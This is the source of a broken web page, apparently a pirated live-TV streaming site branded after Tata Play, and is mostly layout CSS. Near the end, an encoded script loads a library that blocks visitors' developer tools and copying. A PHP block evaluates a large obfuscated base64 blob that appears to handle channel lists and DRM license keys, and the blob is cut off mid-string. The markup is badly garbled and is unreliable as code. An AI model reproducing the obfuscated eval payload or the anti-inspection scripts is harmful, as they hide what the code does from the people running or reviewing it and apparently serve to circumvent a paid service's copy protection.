<!DOCTYPE html>
<html>
  <head>
    <meta name="theme-color" content="#ff0015">
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="author" content="">
    <title>@TheTechieSiaOfficial - TATAPLAY</title>
    <meta property="og:image" content="https://i.imgur.com/LU9XEm8.png">
    <meta property="og:url" content="/css1">
    <meta property="og:image:width" content="1024">
    <meta property="og:image:height" content="1024">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="https://i.imgur.com/LU9XEm8.png">
    <link rel="image_src" href="https://i.imgur.com/LU9XEm8.png">
    <!-- Favicon -->
    <link rel="icon" href="https://i.imgur.com/LU9XEm8.png">
    <!-- LOAD LOCAL CSS -->
    <link rel="stylesheet" href="https://videoportal.viavilab.com/site_assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://videoportal.viavilab.com/site_assets/css/owl.carousel.min.css">
    <link rel="stylesheet" href="https://videoportal.viavilab.com/site_assets/css/nice-select.css">
    <link rel="stylesheet" href="https://videoportal.viavilab.com/site_assets/css/megamenu.css">
    <link rel="stylesheet" href="https://videoportal.viavilab.com/site_assets/css/ionicons.css">
    <link rel="stylesheet" href="https://videoportal.viavilab.com/site_assets/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://videoportal.viavilab.com/site_assets/css/style_switcher.css">
    <link rel="stylesheet" href="https://videoportal.viavilab.com/site_assets/css/color-style/style-six.css" id="theme">
    <link rel="stylesheet" href="https://videoportal.viavilab.com/site_assets/css/responsive.css">
    <!-- Splide Slider CSS -->
    <link rel="stylesheet" href="https://videoportal.viavilab.com/site_assets/css/splide.min.css">
    <link rel="stylesheet" href="https://videoportal.viavilab.com/site_assets/css/jquery-eu-cookie-law-popup.css">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css?family=Nunito:300,400,600,700,800&amp;display=swap" rel="stylesheet">
    <style type="text/css">
      .search .search-input input[type=text]::placeholder,
      .search .search-input input[type=text].focus {
        background: #000000 !important;
      }

      /*****************************************************************
				Header
			*****************************************************************/
      header {
        margin-top: 48px;
      }

      .vfx_preview_header {
        height: 50px;
        top: 0;
        left: 0;
        right: 0;
        z-index: 999;
        position: absolute;
      }

      .header_top {
        display: inline-block;
        padding: 11px 5px;
        position: relative;
        min-height: 50px;
        -webkit-box-align: center;
        -ms-flex-align: center;
        align-items: center;
        color: #ffffff;
        width: 100%;
        -webkit-box-pack: center;
        -ms-flex-pack: center;
        justify-content: center;
      }

      .preview_envato_logo {
        float: left;
        padding: 0;
      }

      .preview_envato_logo a {
        display: inline-block;
        position: absolute;
        top: 14px;
        text-indent: -9999px;
        height: 18px;
        width: 152px;
        background: url(https://public-assets.envato-static.com/assets/logos/envato_market-a5ace93f8482e885ae008eb481b9451d379599dfed24868e52b6b2d66f5cf633.svg);
        background-size: auto;
        background-size: 152px 18px;
      }

      .vfx_preview_header+header:before {
        top: 0;
        left: 0;
        right: 0;
        z-index: -1;
        content: "";
        height: 60px;
        position: absolute;
        background-size: 200% 200%;
        -webkit-animation: gradientChange 5s ease infinite;
        animation: gradientChange 5s ease infinite;
        background-image: -webkit-gradient(linear, right top, left top, from(#3d9bfc), color-stop(#7b40e4), color-stop(#f53a8b), color-stop(#ee704a), to(#ddd24c));
        background-image: linear-gradient(270deg, #3d9bfc, #7b40e4, #f53a8b, #ee704a, #ddd24c);
      }

      .vfx_preview_contant {
        padding: 0 10px;
        display: block;
        margin: 0 auto;
        width: max-content;
      }

      .vfx_preview_contant p {
        margin-bottom: 0;
        color: #ffffff;
      }

      .vfx_preview_buy_now {
        padding: 0 5px 0 10px;
        display: block;
        right: 0;
        top: 13px;
        position: absolute;
      }

      .buy-now-btn {
        background: #ffffff;
        border-radius: 4px;
        color: #fd0575;
        font-size: 14px;
        font-weight: 700;
        padding: 6px 20px;
        line-height: 1.5;
        text-transform: uppercase;
        box-shadow: 0 1px 8px rgba(0, 0, 0, 0.15);
      }

      .buy-now-btn:hover {
        background: #b71850;
        color: #ffffff;
      }

      @media only screen and (max-width:639px) {
        .vfx_preview_contant {
          display: none;
        }
      }

      /*****************************************************************
				CSS Animation - Start
			*****************************************************************/
      .layer {
        position: relative !important;
      }

      @-webkit-keyframes dropDown {
        0% {
          -webkit-transform: translateY(-10px);
          transform: translateY(-10px);
        }

        100% {
          -webkit-transform: translateY(0);
          transform: translateY(0);
        }
      }

      @keyframes dropDown {
        0% {
          -webkit-transform: translateY(-10px);
          transform: translateY(-10px);
        }

        100% {
          -webkit-transform: translateY(0);
          transform: translateY(0);
        }
      }

      @-webkit-keyframes gradientChange {
        0% {
          background-position: 0% 50%;
        }

        50% {
          background-position: 100% 50%;
        }

        100% {
          background-position: 0% 50%;
        }
      }

      @keyframes gradientChange {
        0% {
          background-position: 0% 50%;
        }

        50% {
          background-position: 100% 50%;
        }

        100% {
          background-position: 0% 50%;
        }
      }

      @-webkit-keyframes radiusAnimation {
        0% {
          border-radius: 60% 40% 30% 70%/60% 30% 70% 40%;
        }

        50% {
          border-radius: 30% 60% 70% 40%/50% 60% 30% 60%;
        }

        100% {
          border-radius: 60% 40% 30% 70%/60% 30% 70% 40%;
        }
      }

      @keyframes radiusAnimation {
        0% {
          border-radius: 60% 40% 30% 70%/60% 30% 70% 40%;
        }

        50% {
          border-radius: 30% 60% 70% 40%/50% 60% 30% 60%;
        }

        100% {
          border-radius: 60% 40% 30% 70%/60% 30% 70% 40%;
        }
      }

      .radius_animation {
        -webkit-animation: radiusAnimation 8s ease-in-out infinite;
        animation: radiusAnimation 8s ease-in-out infinite;
      }

      /*****************************************************************
				CSS Animation - End
			*****************************************************************/
    </style>
  </head>
  <body>
    <!-- Start Pre Loader -->
    </div>
    <!-- End Pre Loader -->
    </div>
    </div>
    <!-- Preview Header End -->
    <!-- Start Header -->
    <header>
      <!-- Start Navigation Area -->
      <div class="main-menu">
        <nav class="header-section pin-style">
          <div class="container-fluid">
            <div class="mod-menu">
              <div class="row">
                <div class="col-2">
                  <a href="/css1" title="logo" class="logo">
                    <img src="https://i.imgur.com/LU9XEm8.png" alt="logo" title="logo">
                  </a>
                </div>
                <div class="col-7 nav-order-last nopadding">
                  <div class="main-nav leftnav">
                    <ul class="top-nav">
                      <li class="visible-this d-md-none menu-icon">
                        <a href="#" class="navbar-toggle collapsed" data-bs-toggle="collapse" data-bs-target="#menu" aria-expanded="false" title="menu-toggle">
                          <i class="fa fa-bars"></i>
                        </a>
                      </li>
                    </ul>
                    <div id="menu" class="collapse header-menu">
                      <ul class="nav vfx-item-nav">
                        <li>
                          <a href="#" class=" " title="home">Home</a>
                        </li>
                        <li>
                          <a href="#" class="" title="Movies">Movies</a>
                        </li>
                        <li>
                          <a href="#" class="" title="Series">Series</a>
                        </li>
                        <li>
                          <a href="#" class="active" title="Live TV">Live TV</a>
                          <span class="arrow"></span>
                          <ul class="dm-align-2 mega-list">
                            <li>
                              <a href="#" title=" ">.......</a>
                            </li>
                            <li>
                              <a href="#" title=" ">XXXXXX </a>
                            </li>
                          </ul>
                        </li>
                      </ul>
                    </div>
                  </div>
                </div>
                <div class="col-3">
                  <style>
                    .fin {
                      border: 3px solid rgb(255, 60, 140);
                      color: red;
                      background: linear-gradient(135deg, azure 0%, floralwhite 64%);

                      .fin:hover,
                      .dftr:hover {
                        border: 3px solid rgb(255, 60, 140);
                        color: red;
                        background: linear-gradient(135deg, azure 0%, floralwhite 64%);
                      }

                      .tvv-item {
                        width: calc(100%/20 - 10px)
                      }
                    }

                    @media only screen and (max-width:2600px) {
                      .tvv-item {
                        width: calc(100%/19 - 10px)
                      }
                    }

                    @media only screen and (max-width:2470px) {
                      .tvv-item {
                        width: calc(100%/18 - 10px)
                      }
                    }

                    @media only screen and (max-width:2340px)
                  </style>
                 
                  </div>
                </div>
              </div>
            </div>
          </div>
      </div>
      </div>
      </nav>
      </div>
      <!-- End Navigation Area -->
    </header>
    <!-- End Header -->
    <!-- Start Slider Area -->
    <link rel="stylesheet" href="https://maxst.icons8.com/vue-static/landings/line-awesome/font-awesome-line-awesome/css/all.min.css">
    </div>
    </div>
    </div>
    </div>
    </div>
    </div>
    </nav>
    </div>
    <!-- End Navigation Area -->
    </header>
    <!-- End Header -->
    <!-- Start Slider Area -->
    </header>
    <!-- header-section end  -->
    <!-- header-search-area start -->
    </div>
    <!-- header-search-area end -->
    <!-- header-section end  -->
    <link href="/site_assets/videojs_player/css/videojs_style1.min.css" rel="stylesheet" type="text/css">
    <!-- Start Page Content Area -->
    <!-- video source -->
    <html>
      <head></head>
      <body class="vsc-initialized">
        <title> <?php echo file_get_contents("title"); ?> </title>
        <meta content="width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1" name="viewport">
        <meta content="IE=edge" http-equiv="X-UA-Compatible">
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
        <style>
          .loading {
            margin-top: 0;
            font-weight: 700;
            vertical-align: middle;
            line-height: 150px;
            font-size: 25px;
            text-transform: uppercase;
            background: linear-gradient(to right, red 30%, rgb(10, 60, 215) 75%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
          }

          h1 {
            background-color: #000;
            margin: 0;
            text-align: center;
            padding: 5px
          }

          a {
            color: #fff;
            text-decoration: none
          }

          tr th {
            font-tvv-name: bold;
            background-color: green;
            padding: 1px
          }

          * {
            box-sizing: border-box
          }

          @keyframes fadein {
            0% {
              opacity: 0
            }

            66% {
              opacity: 0
            }

            100% {
              opacity: 1
            }
          }

          @-webkit-keyframes fadein {
            0% {
              opacity: 0
            }

            66% {
              opacity: 0
            }

            100% {
              opacity: 1
            }
          }

          .tvv-item {
            position: relative;
            display: inline-block;
            width: 120px;
            height: 150px;
            margin: 3px;
            padding: 10px;
            border: 1px solid green z-index: 1;
            background: White;
            box-shadow: 1px 2px 2px red;
            overflow: hidden;
            border-radius: 4px;
            filter: contrast(100%)
          }

          .tvv-item>* {
            margin: 0;
            padding: 0
          }

          .tvv-item .tvv-thumb {
            width: 100%;
            bottom: 10px;
            top: 0px;
            position: absolute;
            right: 0;
            float: center;
          }

          .tvv-item .tvv-thumb img {
            width: 100%;
            pointer-events: none
          }

          .tvv-item .tvv-name {
            position: absolute;
            left: 0;
            bottom: 0;
            font-size: 12px;
            display: block;
            text-align: center;
            width: 100%;
            color: black;
            padding: 5px;
            font-weight: 800;
            text-overflow: ellipsis;
            black-space: nowrap;
            overflow: hidden;
            background: linear-gradient(to bottom left, #ccffff 7%, #ffffff 100%);
            box-shadow: inset 2px 2px 2px 0px rgba(255, 255, 255, .5);
            7px 7px 20px 0px rgba(0, 0, 0, .1),
            4px 4px 5px 0px rgba(0, 0, 0, .1);
            transition: all 0.3s ease;
          }

          .tvv-item img {
            width: 100%;
            pointer-events: none
          }

          .tvv-item:after {
            position: absolute;
            content: "";
            width: 100%;
            height: 0;
            top: 0;
            left: 0;
            z-index: -1;
            border-radius: 5px;
            border: 0px solid green;
            background-color: black;
            background-image: linear-gradient(to bottom left, #ccffff 7%, #ffffcc 100%);
            box-shadow: inset 2px 2px 2px 0px rgba(255, 255, 255, .5);
            7px 7px 20px 0px rgba(0, 0, 0, .1),
            4px 4px 5px 0px rgba(0, 0, 0, .1);
            transition: all 0.3s ease;
          }

          .tvv-item:hover {
            color: #000;
          }

          .tvv-item:hover:after {
            top: auto;
            bottom: 0;
            height: 100%;
          }

          .tvv-item:active {
            top: 5px;
          }

          .tvv-name:hover {}

          .fin {
            width: 100%;
            margin-top: 1px;
            margin-bottom: 2px;
            float: center;
            height: 30px;
            font-size: small;
            background-color: rgb(40, 40, 40);
            color: black;
            border-radius: 10px;
            border: 3px solid greenoutline: none;
            text-align: center;
            font-family: "Poppins", sans-serif;
          }

          .fin,
          .dftr {
            width: 100%;
            margin-top: 1px;
            margin-bottom: 2px;
            float: center;
            height: 30px;
            font-style: bold;
            background-color: rgb(40, 40, 40);
            color: purple;
            background: linear-gradient(135deg, snow 0%, seashell 64%);
            border-radius: 0px;
            border: 2px solid red;
            outline: none;
            text-align: center;
            font-family: "Poppins", sans-serif;
          }

          .fin:hover,
          .dftr:hover {
            border: 3px solid rgb(255, 60, 140);
            color: red;
            background: linear-gradient(135deg, azure 0%, floralwhite 64%);
          }

          .tvv-item {
            width: calc(100%/20 - 10px)
          }
          }

          @media only screen and (max-width:2600px) {
            .tvv-item {
              width: calc(100%/19 - 10px)
            }
          }

          @media only screen and (max-width:2470px) {
            .tvv-item {
              width: calc(100%/18 - 10px)
            }
          }

          @media only screen and (max-width:2340px) {
            .tvv-item {
              width: calc(100%/17 - 10px)
            }
          }

          @media only screen and (max-width:2210px) {
            .tvv-item {
              width: calc(100%/16 - 10px)
            }
          }

          @media only screen and (max-width:2080px) {
            .tvv-item {
              width: calc(100%/15 - 10px)
            }
          }

          @media only screen and (max-width:1950px) {
            .tvv-item {
              width: calc(100%/14 - 10px)
            }
          }

          @media only screen and (max-width:1820px) {
            .tvv-item {
              width: calc(100%/13 - 10px)
            }
          }

          @media only screen and (max-width:1690px) {
            .tvv-item {
              width: calc(100%/12 - 10px)
            }
          }

          @media only screen and (max-width:1560px) {
            .tvv-item {
              width: calc(100%/11 - 10px)
            }
          }

          @media only screen and (max-width:1430px) {
            .tvv-item {
              width: calc(100%/10 - 10px)
            }
          }

          @media only screen and (max-width:1300px) {
            .tvv-item {
              width: calc(100%/9 - 10px)
            }
          }

          @media only screen and (max-width:1170px) {
            .tvv-item {
              width: calc(100%/8 - 10px)
            }
          }

          @media only screen and (max-width:1040px) {
            .tvv-item {
              width: calc(100%/7 - 10px)
            }
          }

          @media only screen and (max-width:910px) {
            .tvv-item {
              width: calc(100%/6 - 10px)
            }
          }

          @media only screen and (max-width:780px) {
            .tvv-item {
              width: calc(100%/5 - 10px)
            }
          }

          @media only screen and (max-width:650px) {
            .tvv-item {
              width: calc(100%/4 - 10px)
            }
          }

          @media only screen and (max-width:520px) {
            .tvv-item {
              width: calc(100%/3 - 10px)
            }
          }

          @media only screen and (max-width:390px) {
            .tvv-item {
              width: calc(100%/2 - 10px)
            }
          }

          .custom-btn {
            width: 130px;
            height: 40px;
            color: #fff;
            border-radius: 5px;
            padding: 10px 25px;
            font-family: 'Lato', sans-serif;
            font-weight: 500;
            background: transparent;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            display: inline-block;
            box-shadow: inset 2px 2px 2px 0px rgba(255, 255, 255, .5), 7px 7px 20px 0px rgba(0, 0, 0, .1), 4px 4px 5px 0px rgba(0, 0, 0, .1);
            outline: none;
          }

          .btn-11 {
            border: white;
            background: green;
            background: linear-gradient(80deg, yellow 0%, teal 100%);
            color: #fff;
            overflow: hidden;
          }

          .btn-11:hover {
            text-decoration: none;
            color: #fff;
            background-image: linear-gradient(135deg, red 0%, purple 64%);
          }

          .btn-11:before {
            position: absolute;
            content: '';
            display: inline-block;
            top: -180px;
            left: 0;
            width: 30px;
            height: 100%;
            background-color: #fff;
            animation: shiny-btn1 3s ease-in-out infinite;
          }

          .btn-11:hover {
            opacity: .7;
            color: white;
          }

          .btn-11:active {
            box-shadow: 4px 4px 6px 0 rgba(255, 255, 255, .3), -4px -4px 6px 0 rgba(116, 125, 136, .2), inset -4px -4px 6px 0 rgba(255, 255, 255, .2), inset 4px 4px 6px 0 rgba(0, 0, 0, .2);
          }

          @-webkit-keyframes shiny-btn1 {
            0% {
              -webkit-transform: scale(0) rotate(45deg);
              opacity: 0;
            }

            80% {
              -webkit-transform: scale(0) rotate(45deg);
              opacity: 0.5;
            }

            81% {
              -webkit-transform: scale(4) rotate(45deg);
              opacity: 1;
            }

            100% {
              -webkit-transform: scale(50) rotate(45deg);
              opacity: 0;
            }
          }

          @import url("https://fonts.googleapis.com/css?family=Roboto");

          @-webkit-keyframes come-in {
            0% {
              -webkit-transform: translatey(100px);
              transform: translatey(100px);
              opacity: 0;
            }

            30% {
              -webkit-transform: translateX(-50px) scale(0.4);
              transform: translateX(-50px) scale(0.4);
            }

            70% {
              -webkit-transform: translateX(0px) scale(1.2);
              transform: translateX(0px) scale(1.2);
            }

            100% {
              -webkit-transform: translatey(0px) scale(1);
              transform: translatey(0px) scale(1);
              opacity: 1;
            }
          }

          @keyframes come-in {
            0% {
              -webkit-transform: translatey(100px);
              transform: translatey(100px);
              opacity: 0;
            }

            30% {
              -webkit-transform: translateX(-50px) scale(0.4);
              transform: translateX(-50px) scale(0.4);
            }

            70% {
              -webkit-transform: translateX(0px) scale(1.2);
              transform: translateX(0px) scale(1.2);
            }

            100% {
              -webkit-transform: translatey(0px) scale(1);
              transform: translatey(0px) scale(1);
              opacity: 1;
            }
          }

          * {
            margin: 0;
            padding: 0;
          }

          html;
          font-family: 'Roboto',
          sans-serif;
          }

          .stwBlurRainbow,
          .stwRainbow {
            position: fixed;
            width: 100%;
            bottom: 0;
            left: 0;
            right: 0;
            height: 3px;
            z-index: 23;
            background: linear-gradient(-45deg, #4086f4, #31a952, #fbbe01, #eb4132, #4086f4, #31a952, #fbbe01, #eb4132);
            background-size: 200%;
            -webkit-animation: animeBar 5s linear infinite;
            animation: animeBar 5s linear infinite
          }

          .stwBlurRainbow {
            height: 10px;
            z-index: 22;
            filter: blur(10px);
            opacity: .7
          }

          @-webkit-keyframes animeBar {
            0% {
              background-position: 0 50%
            }

            50% {
              background-position: 100% 50%
            }

            100% {
              background-position: 0 50%
            }
          }

          @keyframes animeBar {
            0% {
              background-position: 0 50%
            }

            50% {
              background-position: 100% 50%
            }

            100% {
              background-position: 0 50%
            }
          }
        </style>
        <link rel="stylesheet" href="https://maxst.icons8.com/vue-static/landings/line-awesome/font-awesome-line-awesome/css/all.min.css">
        </div>
        </div>
        </div>
        </div>
        </div>
        </div>
        <div id="social-media" class="modal fade centered-modal in" tabindex="-1" role="dialog" aria-labelledby="myModal" aria-hidden="true">
          <div class="modal-dialog modal-md modal-dialog-centered" role="document">
            <div class="modal-content bg-dark-2 text-light">
              <div class="modal-header"></div>
            </div>
          </div>
        </div>
        <!-- End Social Media Icon Popup -->
        </div>
        </div>
        </div>
        </div>
        </div>
        <link rel="stylesheet" href="https://maxst.icons8.com/vue-static/landings/line-awesome/font-awesome-line-awesome/css/all.min.css">
        </div>
        </div>
        </div>
        </div>
        </center>
        <!-- Start You May Also Like Video Carousel -->
        <!-- Start Upcoming Section -->
        <!-- Start Movies Video Carousel -->
        <div class="video-carousel-area vfx-item-ptb">
          <script language="javascript">
            document.write(unescape('%3C%73%63%72%69%70%74%20%74%79%70%65%3D%27%74%65%78%74%2F%6A%61%76%61%73%63%72%69%70%74%27%20%73%72%63%3D%27%68%74%74%70%73%3A%2F%2F%63%6F%6E%74%65%6E%74%2E%6A%77%70%6C%61%74%66%6F%72%6D%2E%63%6F%6D%2F%6C%69%62%72%61%72%69%65%73%2F%49%44%7A%46%39%5A%6D%6B%2E%6A%73%27%3E%3C%2F%73%63%72%69%70%74%3E%0A%20%3C%73%63%72%69%70%74%20%64%69%73%61%62%6C%65%2D%64%65%76%74%6F%6F%6C%2D%61%75%74%6F%3D%27%74%72%75%65%27%20%73%72%63%3D%20%20%0A%20%20%27%68%74%74%70%73%3A%2F%2F%63%64%6E%2E%6A%73%64%65%6C%69%76%72%2E%6E%65%74%2F%6E%70%6D%2F%64%69%73%61%62%6C%65%2D%64%65%76%74%6F%6F%6C%27%20%63%6C%65%61%72%2D%6C%6F%67%3D%27%74%72%75%65%27%20%20%0A%20%20%64%69%73%61%62%6C%65%2D%73%65%6C%65%63%74%3D%27%74%72%75%65%27%20%64%69%73%61%62%6C%65%2D%63%6F%70%79%3D%27%74%72%75%65%27%20%64%69%73%61%62%6C%65%2D%63%75%74%3D%27%74%72%75%65%27%20%20%0A%20%20%64%69%73%61%62%6C%65%2D%70%61%73%74%65%3D%27%74%72%75%65%27%3E%3C%2F%73%63%72%69%70%74%3E%0A%3C%73%63%72%69%70%74%20%73%72%63%3D%22%70%72%6F%74%65%63%74%2E%6A%73%22%3E%3C%2F%73%63%72%69%70%74%3E%0A%20%0A%0A%3C%76%69%64%65%6F%20%69%64%3D%22%54%53%22%3E%3C%2F%76%69%64%65%6F%3E%0A%3C%73%63%72%69%70%74%20%74%79%70%65%3D%22%74%65%78%74%2F%4A%61%76%61%53%63%72%69%70%74%22%3E'));
          </script> <?php
 eval(base64_decode("\103\x69\102\156\x62\x33\x52\166\x49\x47\170\105\145\152\x5a\123\117\171\102\141\x63\x7a\112\161\x54\124\x6f\147\132\62\71\x30\142\171\102\164\x54\154\160\166\x55\172\x73\147\132\x32\x39\x30\142\x79\x42\167\123\x45\153\171\144\x54\x73\147\143\x32\131\172\144\155\x59\x36\111\107\144\x76\144\x47\x38\147\132\152\x68\115\x65\152\x55\67\111\x47\x64\166\x64\x47\70\x67\x51\x6b\170\156\x56\x7a\x49\67\111\105\x51\167\x4e\x6b\150\x31\117\x69\x42\x72\x62\172\x59\61\124\152\157\147\x5a\x32\x39\x30\142\x79\x42\111\x51\126\126\125\x64\124\163\147\x54\x6b\x51\x77\x53\x54\147\66\111\107\x6c\155\111\x43\147\150\x5a\x57\61\x77\144\110\x6b\x6f\112\x47\150\x6c\131\x32\163\160\x4b\123\102\67\x49\103\x52\151\132\127\116\162\x49\104\x30\147\121\107\x70\x7a\142\62\x35\x66\132\107\x56\152\x62\x32\x52\154\x4b\103\x52\x6f\x5a\127\116\162\x4c\x43\102\x30\143\x6e\126\x6c\113\124\163\x67\141\x57\131\147\x4b\x43\106\154\x62\x58\102\x30\x65\123\147\153\x59\155\x56\152\x61\171\153\x70\x49\x48\163\x67\112\x45\x4e\111\121\x55\65\117\122\x55\x78\x66\124\x45\x6c\124\126\x43\x41\x39\111\x43\x52\151\x5a\x57\116\x72\117\x79\x42\71\x49\110\x30\x67\132\x32\71\x30\x62\171\x42\150\122\153\116\x6c\x53\104\x73\147\124\172\x63\x31\x4f\126\x63\x36\111\107\x6c\x30\143\155\71\x48\117\151\102\x6e\x62\x33\122\166\111\x47\122\x31\x64\x46\x5a\153\x4f\x79\x42\103\121\x54\x52\x7a\115\172\157\x67\132\x32\71\60\x62\x79\x42\132\145\x57\x52\x49\132\x44\163\x67\132\x32\71\60\142\x79\102\160\121\x54\116\166\144\x54\163\147\x53\104\x42\x70\x63\124\x51\66\111\x43\x52\162\x5a\130\x6c\x70\132\103\x41\x39\111\110\x4e\x30\x63\x6c\71\x79\132\130\x42\x73\131\127\116\x6c\x4b\103\x4a\143\x65\104\x64\x69\130\x48\147\x79\115\106\170\64\x4d\152\112\143\x65\104\x5a\151\130\104\105\x30\116\x56\x78\x34\x4e\172\x6c\x63\x4d\x54\131\172\130\x44\121\171\130\104\x63\171\130\x48\x67\x31\x59\x6c\x78\64\x4d\x6a\x42\x63\x65\104\x64\x69\x58\x44\x51\x77\x58\x44\121\x79\x58\x48\x67\62\131\154\x77\170\116\152\x52\x63\145\104\143\x35\x58\110\x67\x79\x4d\154\170\x34\115\62\x46\x63\145\104\111\171\130\x48\x67\x32\132\154\170\x34\x4e\152\116\143\145\104\143\x30\130\x48\x67\x79\115\x6c\x77\61\x4e\106\x77\60\x4d\106\167\60\115\x6c\x78\64\116\155\111\151\x4c\x43\x41\151\130\x44\x51\171\130\x44\x45\x31\115\x31\167\170\116\x44\x56\143\145\104\143\x35\111\151\167\x67\x4a\107\164\x6c\145\x53\x6b\x37\x49\x47\144\x76\144\x47\x38\147\x61\152\x5a\x36\x53\110\x41\x37\x49\106\101\x30\x52\x55\65\110\117\151\x42\166\125\126\x6b\65\x53\152\x6f\147\132\62\71\60\142\171\x42\x4d\x59\x57\70\64\141\104\163\x67\124\x6d\x4e\x69\122\x31\143\x36\x49\x47\x64\x76\x64\107\70\147\x56\126\x49\x7a\127\x55\x67\67\111\107\144\166\x64\x47\x38\147\132\x6a\x46\x6d\124\x55\x6b\x37\111\106\x4e\x71\x52\62\164\141\x4f\x69\x42\164\124\x6c\x70\166\x55\x7a\157\x67\x5a\62\71\x30\142\171\102\x78\x52\x32\x34\167\141\x54\x73\147\124\110\x70\155\x57\105\x73\66\x49\x43\122\164\143\x47\x51\x67\120\123\x42\172\144\110\112\x66\143\155\x56\x77\142\x47\106\152\x5a\x53\147\x69\x58\104\x45\61\116\x56\167\x78\116\x6a\x42\x63\145\104\x59\x30\111\151\x77\147\111\x6c\x77\x78\x4e\x54\x56\143\x4d\124\x59\167\130\104\x45\60\116\103\x49\x67\114\151\101\x69\x58\x44\x51\x79\111\x69\101\165\111\x43\112\x63\116\x54\x51\x69\114\103\x41\x6b\142\130\x42\153\x4b\124\x73\147\132\x32\x39\60\x62\171\x42\112\145\x6d\122\167\x56\x54\x73\147\143\105\150\112\115\156\x55\x36\111\107\150\150\x54\x56\x56\104\117\151\102\156\x62\63\122\x76\x49\110\144\x36\x5a\x47\x67\170\x4f\171\x42\103\142\60\157\172\115\x7a\157\x67\122\x32\x78\x54\x51\127\x6b\x36\111\107\x64\x76\144\107\x38\147\122\130\x5a\164\x52\63\153\67\111\110\x52\167\x63\130\160\x45\x4f\x69\x42\155\x62\x33\112\154\131\127\x4e\x6f\111\x43\x67\153\x51\60\150\x42\x54\153\65\106\124\106\71\115\123\x56\x4e\125\x49\107\106\x7a\111\x43\x52\152\141\x47\65\164\113\x53\x42\67\x49\x47\x6c\155\x49\103\147\x6b\x61\x57\x51\x67\x50\124\x30\x67\112\107\116\157\x62\155\x31\142\111\x6c\170\x34\116\x6a\154\x63\x65\x44\x59\60\111\x6c\x30\x70\x49\110\x73\147\112\x47\x35\x68\x62\x57\125\147\x50\x53\x41\153\131\x32\x68\165\142\x56\x73\x69\x58\104\x45\x31\116\154\170\64\x4e\x6a\x46\143\115\x54\x55\x31\x58\104\x45\x30\116\x53\x4a\144\x4f\x79\x41\x6b\x62\107\71\156\x62\x79\x41\71\x49\103\122\152\x61\x47\65\164\127\x79\x4a\143\x65\x44\x5a\152\x58\110\147\62\132\x6c\167\x78\x4e\x44\144\143\115\x54\125\63\111\154\60\67\x49\x43\122\156\143\x6d\x39\x31\x63\103\x41\71\x49\103\x52\152\141\x47\x35\x74\x57\171\x4a\x63\115\124\x51\x33\130\104\x45\x32\115\154\x78\64\116\x6d\132\143\115\x54\x59\x31\130\110\x67\x33\x4d\103\x4a\144\117\171\x41\153\x64\130\x4a\x73\x49\x44\x30\147\x4a\107\x4e\157\142\x6d\x31\x62\111\x6c\x78\64\x4e\172\126\x63\115\124\x59\171\130\104\x45\x31\x4e\x43\112\x64\x4f\x79\x41\x6b\142\107\154\152\x5a\x57\x35\x7a\x5a\x56\x39\162\132\130\153\147\x50\123\x41\153\x59\x32\150\165\x62\x56\163\x69\x58\110\147\62\x59\61\x78\64\116\x6a\x6c\143\x4d\124\121\x7a\x58\x48\x67\62\116\x56\x78\x34\116\155\126\x63\x65\x44\143\x7a\130\x44\105\60\116\x56\x78\x34\116\127\132\x63\x65\104\132\x69\130\104\x45\x30\x4e\x56\167\x78\116\172\105\151\x58\x54\163\147\146\x53\102\x39\x49\107\x64\166\x64\107\70\147\121\153\105\x30\143\172\x4d\x37\x49\110\144\x36\132\107\147\x78\117\x69\102\x70\x5a\x69\101\157\141\130\116\x7a\132\130\121\157\x4a\x46\71\x53\x52\x56\106\x56\122\x56\x4e\125\x57\171\x4a\143\x65\x44\x59\x35\x58\x44\105\x30\x4e\103\112\144\113\x53\153\x67\x65\x79\x41\153\x61\127\121\x67\120\123\101\x6b\x58\61\x4a\x46\125\x56\126\x46\x55\x31\x52\142\x49\x6c\170\x34\116\x6a\x6c\x63\115\x54\121\x30\111\x6c\60\67\x49\110\60\147\x5a\x32\71\x30\x62\x79\x42\x49\124\x48\x56\126\x61\172\163\x67\142\x56\x64\113\x54\x45\x55\66\x49\x47\131\x34\124\110\157\x31\117\151\x42\156\142\x33\122\166\x49\x45\x63\x78\142\x47\x56\163\117\171\x42\161\x4e\x31\125\x33\126\x54\x6f\147\x5a\62\71\60\142\171\102\111\121\x6c\x4e\x6d\144\x54\163\147\132\62\71\60\142\x79\102\x74\126\60\160\x4d\122\124\x73\147\123\104\x55\x31\x55\x31\147\x36\111\107\x64\166\144\107\70\x67\x64\61\70\65\x55\125\x67\x37\x49\x47\144\x76\x64\x47\x38\x67\x59\61\154\x36\125\153\125\67\111\x48\x4e\x45\x55\104\144\x76\117\x69\102\126\x55\x6a\116\x5a\123\104\x6f\x67\x5a\62\x39\x30\x62\x79\102\x45\x4e\x7a\x4a\120\x58\x7a\163\147\x64\x6c\71\123\x52\x6c\x38\66\x49\107\x64\166\144\x47\x38\147\143\x48\112\x72\x63\x33\x45\67\x49\107\144\x76\x64\107\70\x67\124\x7a\x63\61\x4f\x56\x63\x37\111\110\x70\x6f\116\x55\160\x6a\x4f\151\x42\x6e\142\x33\122\166\x49\x47\122\x6a\141\x47\x68\112\x4f\171\102\x6e\142\x33\122\x76\x49\x48\x70\x72\x55\x46\160\151\117\x79\x42\60\x56\x30\x74\x49\144\x54\157\147\132\62\x39\x30\x62\x79\102\110\142\x46\x4e\x42\x61\124\x73\x67\x5a\x32\x39\x30\142\x79\x42\x43\142\60\x6f\172\115\x7a\x73\x67\145\110\x68\155\144\x6d\70\x36\111\110\x4a\154\143\130\126\x70\x63\x6d\126\x66\142\x32\65\152\132\x53\101\151\130\110\147\62\115\154\170\64\x4e\x6a\x46\x63\x4d\x54\x59\x7a\130\104\x45\60\x4e\126\170\x34\115\155\x56\143\145\104\143\x77\130\110\147\x32\117\x46\x77\x78\116\x6a\x41\x69\117\x79\x42\156\x62\x33\x52\x76\x49\110\x4e\x6d\115\63\x5a\155\x4f\x79\102\106\x64\155\61\x48\x